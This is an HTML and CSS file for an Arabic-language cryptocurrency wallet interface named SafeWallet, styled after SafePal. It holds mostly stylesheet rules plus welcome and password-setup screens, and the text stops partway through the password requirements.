
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafeWallet - محفظة آمنة</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* إعادة تعيين الأنماط الأساسية */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* المتغيرات العامة */
        :root {
            /* الألوان الأساسية - مستوحاة من SafePal */
            --primary-color: #1652f0;
            --primary-dark: #0d47d9;
            --secondary-color: #00d4aa;
            --accent-color: #ff6b35;
            --success-color: #00c896;
            --warning-color: #ffb020;
            --error-color: #ff4757;
            
            /* ألوان الخلفية */
            --bg-primary: #0f0f23;
            --bg-secondary: #1a1a3a;
            --bg-tertiary: #252547;
            --bg-card: #1e1e3f;
            --bg-modal: #2a2a4a;
            
            /* ألوان النص */
            --text-primary: #ffffff;
            --text-secondary: #b8bcc8;
            --text-muted: #8b8ca7;
            --text-inverse: #0f0f23;
            
            /* ألوان الحدود */
            --border-color: #3a3a5c;
            --border-light: #4a4a6c;
            
            /* الظلال */
            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.1);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.2);
            --shadow-xl: 0 16px 48px rgba(0, 0, 0, 0.3);
            
            /* المسافات */
            --spacing-xs: 4px;
            --spacing-sm: 8px;
            --spacing-md: 16px;
            --spacing-lg: 24px;
            --spacing-xl: 32px;
            --spacing-2xl: 48px;
            
            /* أحجام الخط */
            --font-xs: 12px;
            --font-sm: 14px;
            --font-md: 16px;
            --font-lg: 18px;
            --font-xl: 20px;
            --font-2xl: 24px;
            --font-3xl: 32px;
            
            /* الانتقالات */
            --transition-fast: 0.15s ease;
            --transition-normal: 0.3s ease;
            --transition-slow: 0.5s ease;
        }

        /* الخطوط */
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            direction: rtl;
            overflow-x: hidden;
        }

        /* الحاوي الرئيسي */
        .app-container {
            min-height: 100vh;
            position: relative;
        }

        /* الشاشات */
        .screen {
            display: none;
            min-height: 100vh;
            padding: var(--spacing-lg);
            animation: fadeIn 0.4s ease;
        }

        .screen.active {
            display: block;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* شاشة الترحيب */
        .welcome-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            max-width: 400px;
            margin: 0 auto;
        }

        .logo-section {
            margin-bottom: var(--spacing-2xl);
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto var(--spacing-lg);
            box-shadow: var(--shadow-lg);
            position: relative;
            overflow: hidden;
        }

        .logo::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .logo i {
            font-size: 36px;
            color: white;
            z-index: 1;
        }

        .welcome-container h1 {
            font-size: var(--font-3xl);
            font-weight: 700;
            margin-bottom: var(--spacing-sm);
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .tagline {
            color: var(--text-secondary);
            font-size: var(--font-lg);
            margin-bottom: var(--spacing-2xl);
        }

        .welcome-actions {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-xl);
        }

        .security-note {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            color: var(--text-muted);
            font-size: var(--font-sm);
        }

        .security-note i {
            color: var(--success-color);
        }

        /* الأزرار */
        .btn {
            padding: var(--spacing-md) var(--spacing-lg);
            border: none;
            border-radius: 12px;
            font-size: var(--font-md);
            font-weight: 600;
            cursor: pointer;
            transition: all var(--transition-normal);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-sm);
            text-decoration: none;
            position: relative;
            overflow: hidden;
            min-height: 48px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            box-shadow: var(--shadow-md);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: var(--bg-card);
            color: var(--text-primary);
            border: 2px solid var(--border-color);
            box-shadow: var(--shadow-sm);
        }

        .btn-secondary:hover {
            border-color: var(--primary-color);
            background: var(--bg-tertiary);
            transform: translateY(-1px);
        }

        .btn-full {
            width: 100%;
        }

        /* رؤوس الشاشات */
        .screen-header {
            display: flex;
            align-items: center;
            margin-bottom: var(--spacing-xl);
            gap: var(--spacing-md);
        }

        .back-btn {
            width: 40px;
            height: 40px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all var(--transition-fast);
        }

        .back-btn:hover {
            background: var(--bg-tertiary);
            border-color: var(--primary-color);
        }

        .screen-header h2 {
            font-size: var(--font-2xl);
            font-weight: 600;
            color: var(--text-primary);
        }

        /* شاشة كلمة المرور */
        .password-container {
            max-width: 500px;
            margin: 0 auto;
        }

        .password-form {
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-xl);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .form-section {
            margin-bottom: var(--spacing-xl);
        }

        .form-section label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-primary);
        }

        .password-input-container {
            position: relative;
        }

        .password-input {
            width: 100%;
            padding: var(--spacing-md);
            padding-left: 50px;
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            transition: border-color var(--transition-fast);
        }

        .password-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .password-toggle {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            font-size: var(--font-md);
        }

        .password-toggle:hover {
            color: var(--primary-color);
        }

        .password-strength {
            margin-top: var(--spacing-sm);
            height: 4px;
            background: var(--bg-tertiary);
            border-radius: 2px;
            overflow: hidden;
        }

        .password-strength-bar {
            height: 100%;
            width: 0%;
            transition: all var(--transition-normal);
            border-radius: 2px;
        }

        .password-strength-bar.weak {
            width: 25%;
            background: var(--error-color);
        }

        .password-strength-bar.fair {
            width: 50%;
            background: var(--warning-color);
        }

        .password-strength-bar.good {
            width: 75%;
            background: var(--secondary-color);
        }

        .password-strength-bar.strong {
            width: 100%;
            background: var(--success-color);
        }

        .password-requirements {
            margin-top: var(--spacing-sm);
            font-size: var(--font-sm);
            color: var(--text-muted);
        }

        .password-requirements ul {
            list-style: none;
            margin-top: var(--spacing-xs);
        }

        .password-requirements li {
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
            margin-bottom: var(--spacing-xs);
        }

        .password-requirements li.valid {
            color: var(--success-color);
        }

        .password-requirements li.invalid {
            color: var(--error-color);
        }

        /* شاشة الاستيراد */
        .import-container {
            max-width: 500px;
            margin: 0 auto;
        }

        .import-form {
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-xl);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        #mnemonicInput {
            width: 100%;
            padding: var(--spacing-md);
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            resize: vertical;
            min-height: 120px;
            transition: border-color var(--transition-fast);
        }

        #mnemonicInput:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .input-hint {
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
            margin-top: var(--spacing-sm);
            color: var(--text-muted);
            font-size: var(--font-sm);
        }

        .security-warning {
            background: rgba(255, 107, 53, 0.1);
            border: 1px solid var(--accent-color);
            border-radius: 12px;
            padding: var(--spacing-md);
            display: flex;
            gap: var(--spacing-md);
            align-items: flex-start;
        }

        .security-warning i {
            color: var(--accent-color);
            margin-top: 2px;
        }

        .security-warning strong {
            color: var(--accent-color);
        }

        /* شاشة إنشاء المحفظة */
        .create-container {
            max-width: 600px;
            margin: 0 auto;
        }

        .wallet-info-card {
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-xl);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .info-section {
            margin-bottom: var(--spacing-lg);
        }

        .info-section:last-child {
            margin-bottom: 0;
        }

        .info-section label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-secondary);
            font-size: var(--font-sm);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .address-display {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            background: var(--bg-tertiary);
            padding: var(--spacing-md);
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }

        .address-display span {
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: var(--font-sm);
            word-break: break-all;
            color: var(--text-primary);
        }

        .mnemonic-display {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            position: relative;
        }

        .mnemonic-words {
            padding: var(--spacing-md);
            font-family: 'Courier New', monospace;
            font-size: var(--font-sm);
            line-height: 1.8;
            color: var(--text-primary);
            min-height: 80px;
            display: flex;
            align-items: center;
        }

        .copy-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: background-color var(--transition-fast);
            min-width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .copy-btn:hover {
            background: var(--primary-dark);
        }

        .backup-warning {
            background: rgba(0, 200, 150, 0.1);
            border: 1px solid var(--success-color);
            border-radius: 12px;
            padding: var(--spacing-md);
            display: flex;
            gap: var(--spacing-md);
            align-items: flex-start;
            margin-bottom: var(--spacing-lg);
        }

        .backup-warning i {
            color: var(--success-color);
            margin-top: 2px;
        }

        .backup-warning strong {
            color: var(--success-color);
        }

        /* شاشة المحفظة الرئيسية */
        .wallet-container {
            max-width: 800px;
            margin: 0 auto;
        }

        .wallet-header {
            margin-bottom: var(--spacing-xl);
        }

        .wallet-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .wallet-name h3 {
            font-size: var(--font-xl);
            margin-bottom: var(--spacing-xs);
        }

        .wallet-address-short {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        .wallet-address-short span {
            font-family: 'Courier New', monospace;
            color: var(--text-secondary);
            font-size: var(--font-sm);
        }

        .copy-btn-small {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-secondary);
            padding: var(--spacing-xs);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .copy-btn-small:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .settings-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-secondary);
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .settings-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
            background: rgba(22, 82, 240, 0.1);
        }

        /* قسم الرصيد */
        .balance-section {
            margin-bottom: var(--spacing-xl);
        }

        .balance-card {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            border-radius: 20px;
            padding: var(--spacing-xl);
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: var(--shadow-lg);
        }

        .balance-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.5; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }

        .balance-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-md);
            position: relative;
            z-index: 1;
        }

        .balance-header span {
            color: rgba(255, 255, 255, 0.9);
            font-size: var(--font-sm);
            font-weight: 500;
        }

        .refresh-btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 6px;
            color: white;
            padding: var(--spacing-xs);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .refresh-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(180deg);
        }

        .balance-amount {
            font-size: var(--font-3xl);
            font-weight: 700;
            color: white;
            margin-bottom: var(--spacing-sm);
            position: relative;
            z-index: 1;
        }

        .currency {
            font-size: var(--font-lg);
            opacity: 0.9;
        }

        .balance-usd {
            color: rgba(255, 255, 255, 0.8);
            font-size: var(--font-md);
            position: relative;
            z-index: 1;
        }

        /* الإجراءات السريعة */
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-xl);
        }

        .action-btn {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: var(--spacing-lg);
            cursor: pointer;
            transition: all var(--transition-normal);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-sm);
            text-align: center;
            color: var(--text-primary);
            box-shadow: var(--shadow-sm);
        }

        .action-btn:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-md);
            border-color: var(--primary-color);
        }

        .action-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            margin-bottom: var(--spacing-xs);
        }

        .action-icon.send {
            background: linear-gradient(135deg, var(--accent-color), #ff8c42);
            color: white;
        }

        .action-icon.receive {
            background: linear-gradient(135deg, var(--success-color), #00e6b8);
            color: white;
        }

        .action-icon.swap {
            background: linear-gradient(135deg, var(--secondary-color), #00f0cc);
            color: white;
        }

        .action-icon.buy {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
        }

        .action-icon.support {
            background: linear-gradient(135deg, var(--warning-color), #ffcc00);
            color: white;
        }

        .action-btn span {
            font-size: var(--font-sm);
            font-weight: 500;
        }

        /* الأقسام */
        .assets-section,
        .transactions-section {
            margin-bottom: var(--spacing-xl);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-md);
        }

        .section-header h4 {
            font-size: var(--font-lg);
            font-weight: 600;
            color: var(--text-primary);
        }

        .add-btn,
        .view-all-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-secondary);
            padding: var(--spacing-xs) var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            font-size: var(--font-sm);
        }

        .add-btn:hover,
        .view-all-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        /* قائمة الأصول */
        .assets-list {
            background: var(--bg-card);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
        }

        .loading-assets {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-md);
            padding: var(--spacing-xl);
            color: var(--text-secondary);
        }

        .asset-item {
            display: flex;
            align-items: center;
            padding: var(--spacing-md);
            border-bottom: 1px solid var(--border-color);
            transition: background-color var(--transition-fast);
        }

        .asset-item:hover {
            background: var(--bg-tertiary);
        }

        .asset-item:last-child {
            border-bottom: none;
        }

        .asset-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: var(--spacing-md);
            color: white;
            font-weight: 600;
            font-size: var(--font-sm);
        }

        .asset-details {
            flex: 1;
        }

        .asset-details h5 {
            font-size: var(--font-md);
            margin-bottom: 2px;
            color: var(--text-primary);
        }

        .asset-details p {
            font-size: var(--font-sm);
            color: var(--text-secondary);
        }

        .asset-balance {
            text-align: left;
            font-weight: 600;
            color: var(--text-primary);
        }

        /* قائمة المعاملات */
        .transactions-list {
            background: var(--bg-card);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
        }

        .no-transactions {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-sm);
            padding: var(--spacing-xl);
            color: var(--text-muted);
        }

        .no-transactions i {
            font-size: var(--font-2xl);
            opacity: 0.5;
        }

        /* النوافذ المنبثقة */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
            animation: modalFadeIn 0.3s ease;
        }

        @keyframes modalFadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .modal-content {
            background: var(--bg-modal);
            border-radius: 16px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: var(--shadow-xl);
            animation: modalSlideIn 0.3s ease;
        }

        @keyframes modalSlideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: var(--spacing-lg);
            border-bottom: 1px solid var(--border-color);
        }

        .modal-header h3 {
            font-size: var(--font-xl);
            color: var(--text-primary);
        }

        .close-btn {
            background: transparent;
            border: none;
            border-radius: 6px;
            color: var(--text-secondary);
            font-size: var(--font-lg);
            cursor: pointer;
            padding: var(--spacing-xs);
            transition: color var(--transition-fast);
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .close-btn:hover {
            color: var(--text-primary);
        }

        .modal-body {
            padding: var(--spacing-lg);
        }

        /* نماذج الإدخال */
        .form-group {
            margin-bottom: var(--spacing-lg);
        }

        .form-group label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-primary);
        }

        .form-group input,
        .form-group select,
        .form-group textarea {
            width: 100%;
            padding: var(--spacing-md);
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            transition: border-color var(--transition-fast);
        }

        .form-group input:focus,
        .form-group select:focus,
        .form-group textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .form-group textarea {
            resize: vertical;
            min-height: 100px;
        }

        .input-with-scan {
            display: flex;
            gap: var(--spacing-sm);
        }

        .input-with-scan input {
            flex: 1;
        }

        .scan-btn {
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-secondary);
            padding: var(--spacing-md);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scan-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .amount-input {
            display: flex;
            gap: var(--spacing-sm);
        }

        .amount-input input {
            flex: 1;
        }

        .amount-input select {
            width: 120px;
        }

        /* خيارات الغاز */
        .gas-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: var(--spacing-sm);
        }

        .gas-option {
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            padding: var(--spacing-md);
            cursor: pointer;
            transition: all var(--transition-fast);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-xs);
            color: var(--text-primary);
        }

        .gas-option:hover {
            border-color: var(--primary-color);
        }

        .gas-option.active {
            border-color: var(--primary-color);
            background: rgba(22, 82, 240, 0.1);
        }

        .gas-price {
            font-size: var(--font-xs);
            color: var(--text-secondary);
        }

        /* نافذة الاستقبال */
        .receive-content {
            text-align: center;
        }

        .qr-section {
            margin-bottom: var(--spacing-lg);
        }

        .qr-code {
            width: 200px;
            height: 200px;
            background: white;
            border-radius: 12px;
            margin: 0 auto var(--spacing-md);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: var(--shadow-md);
        }

        .address-section {
            margin-bottom: var(--spacing-lg);
        }

        .receive-warning {
            background: rgba(255, 182, 32, 0.1);
            border: 1px solid var(--warning-color);
            border-radius: 8px;
            padding: var(--spacing-md);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            font-size: var(--font-sm);
            color: var(--warning-color);
        }

        /* نافذة الإعدادات */
        .settings-list {
            display: flex;
            flex-direction: column;
            gap: 1px;
            background: var(--border-color);
            border-radius: 8px;
            overflow: hidden;
        }

        .setting-item {
            background: var(--bg-tertiary);
            padding: var(--spacing-md);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .setting-item.danger {
            background: rgba(255, 71, 87, 0.1);
        }

        .setting-info {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            color: var(--text-primary);
        }

        .setting-item.danger .setting-info {
            color: var(--error-color);
        }

        .setting-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-secondary);
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .setting-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .setting-btn.danger {
            border-color: var(--error-color);
            color: var(--error-color);
        }

        .setting-btn.danger:hover {
            background: var(--error-color);
            color: white;
        }

        /* شاشة التحميل */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 15, 35, 0.9);
            z-index: 2000;
            backdrop-filter: blur(4px);
        }

        .loading-overlay.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-content {
            text-align: center;
            color: var(--text-primary);
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            margin: 0 auto var(--spacing-md);
            animation: spin 1s linear infinite;
        }

        .loading-spinner.large {
            width: 60px;
            height: 60px;
            border-width: 4px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* رسائل التنبيه */
        .toast-container {
            position: fixed;
            top: var(--spacing-lg);
            right: var(--spacing-lg);
            z-index: 3000;
            display: flex;
            flex-direction: column;
            gap: var(--spacing-sm);
        }

        .toast {
            background: var(--bg-modal);
            color: var(--text-primary);
            border-radius: 8px;
            padding: var(--spacing-md) var(--spacing-lg);
            box-shadow: var(--shadow-lg);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            min-width: 300px;
            animation: toastSlideIn 0.3s ease;
        }

        @keyframes toastSlideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes toastSlideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(100%);
                opacity: 0;
            }
        }

        .toast.success {
            border-right: 4px solid var(--success-color);
        }

        .toast.error {
            border-right: 4px solid var(--error-color);
        }

        .toast.warning {
            border-right: 4px solid var(--warning-color);
        }

        .toast.info {
            border-right: 4px solid var(--primary-color);
        }

        /* نافذة ماسح QR */
        .qr-scanner-container {
            text-align: center;
        }

        .scanner-video {
            width: 100%;
            max-width: 300px;
            height: 200px;
            background: var(--bg-tertiary);
            border-radius: 8px;
            margin-bottom: var(--spacing-md);
        }

        .scanner-controls {
            display: flex;
            gap: var(--spacing-sm);
            justify-content: center;
            margin-bottom: var(--spacing-md);
        }

        .scanner-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            padding: var(--spacing-sm) var(--spacing-md);
            cursor: pointer;
            transition: background-color var(--transition-fast);
            font-size: var(--font-sm);
        }

        .scanner-btn:hover {
            background: var(--primary-dark);
        }

        .scanner-btn:disabled {
            background: var(--border-color);
            cursor: not-allowed;
        }

        /* نافذة طلب كلمة المرور */
        .password-prompt-modal {
            background: rgba(0, 0, 0, 0.9);
        }

        .password-prompt-content {
            max-width: 400px;
            width: 90%;
        }

        .password-prompt-form {
            display: flex;
            flex-direction: column;
            gap: var(--spacing-md);
        }

        .password-prompt-input {
            padding: var(--spacing-md);
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            text-align: center;
        }

        .password-prompt-input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .password-prompt-buttons {
            display: flex;
            gap: var(--spacing-sm);
        }

        .password-prompt-buttons button {
            flex: 1;
        }

        /* التصميم المتجاوب */
        @media (max-width: 768px) {
            .screen {
                padding: var(--spacing-md);
            }
            
            .welcome-container {
                padding: var(--spacing-md);
            }
            
            .logo {
                width: 60px;
                height: 60px;
            }
            
            .logo i {
                font-size: 28px;
            }
            
            .welcome-container h1 {
                font-size: var(--font-2xl);
            }
            
            .quick-actions {
                grid-template-columns: repeat(3, 1fr);
            }
            
            .action-icon {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
            
            .balance-amount {
                font-size: var(--font-2xl);
            }
            
            .wallet-info {
                flex-direction: column;
                gap: var(--spacing-md);
                text-align: center;
            }
            
            .modal-content {
                width: 95%;
                margin: var(--spacing-md);
            }
            
            .gas-options {
                grid-template-columns: 1fr;
            }
            
            .toast-container {
                right: var(--spacing-md);
                left: var(--spacing-md);
            }
            
            .toast {
                min-width: auto;
            }
        }

        @media (max-width: 480px) {
            .screen {
                padding: var(--spacing-sm);
            }
            
            .welcome-actions {
                gap: var(--spacing-sm);
            }
            
            .btn {
                padding: var(--spacing-sm) var(--spacing-md);
                font-size: var(--font-sm);
            }
            
            .quick-actions {
                gap: var(--spacing-sm);
                grid-template-columns: repeat(2, 1fr);
            }
            
            .action-btn {
                padding: var(--spacing-md);
            }
            
            .balance-card {
                padding: var(--spacing-lg);
            }
            
            .wallet-info {
                padding: var(--spacing-md);
            }
            
            .modal-body {
                padding: var(--spacing-md);
            }
            
            .form-group {
                margin-bottom: var(--spacing-md);
            }
        }

        /* تحسينات إضافية للأداء */
        * {
            -webkit-tap-highlight-color: transparent;
        }

        button, .btn {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* تأثيرات التمرير */
        .screen {
            scroll-behavior: smooth;
        }

        /* تحسين الخطوط */
        body {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- شاشة الترحيب -->
        <div id="welcomeScreen" class="screen active">
            <div class="welcome-container">
                <div class="logo-section">
                    <div class="logo">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <h1>SafeWallet</h1>
                    <p class="tagline">محفظتك الآمنة للعملات الرقمية</p>
                </div>
                
                <div class="welcome-actions">
                    <button id="importWalletBtn" class="btn btn-primary btn-full">
                        <i class="fas fa-download"></i>
                        استيراد محفظة موجودة
                    </button>
                    <button id="createWalletBtn" class="btn btn-secondary btn-full">
                        <i class="fas fa-plus"></i>
                        إنشاء محفظة جديدة
                    </button>
                </div>
                
                <div class="security-note">
                    <i class="fas fa-lock"></i>
                    <span>محفظتك آمنة ومشفرة بالكامل</span>
                </div>
            </div>
        </div>

        <!-- شاشة كلمة المرور -->
        <div id="passwordScreen" class="screen">
            <div class="password-container">
                <div class="screen-header">
                    <button id="backToCreateFromPasswordBtn" class="back-btn">
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <h2>تعيين كلمة المرور</h2>
                </div>
                
                <div class="password-form">
                    <div class="form-section">
                        <label for="passwordInput">كلمة المرور</label>
                        <div class="password-input-container">
                            <input type="password" id="passwordInput" class="password-input" placeholder="أدخل كلمة مرور قوية">
                            <button type="button" id="togglePassword" class="password-toggle">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                        <div class="password-strength">
                            <div id="passwordStrengthBar" class="password-strength-bar"></div>
                        </div>
                        <div class="password-requirements">
                            <p>متطلبات كلمة المرور:</p>
                            <ul>
                                <li id="lengthReq" class="invalid">
                                    <i class="fas fa-times"></i>
                                    <span>8 أحرف على الأقل</span>
                                </li>
